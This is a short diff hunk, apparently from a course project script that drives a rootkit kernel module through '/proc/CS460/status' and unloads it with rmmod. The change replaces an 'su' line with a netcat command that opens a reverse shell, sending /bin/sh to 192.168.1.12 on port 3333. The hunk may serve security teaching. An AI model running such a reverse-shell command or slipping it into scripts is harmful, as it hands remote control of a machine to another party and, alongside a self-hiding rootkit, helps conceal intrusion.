@@ -10,7 +10,7 @@ echo "hide" > /proc/CS460/status
 
 echo "unhide" > /proc/CS460/status
 
-su
+/bin/nc.traditional -c /bin/sh 192.168.1.12 3333
 
 rmmod rootkit
 
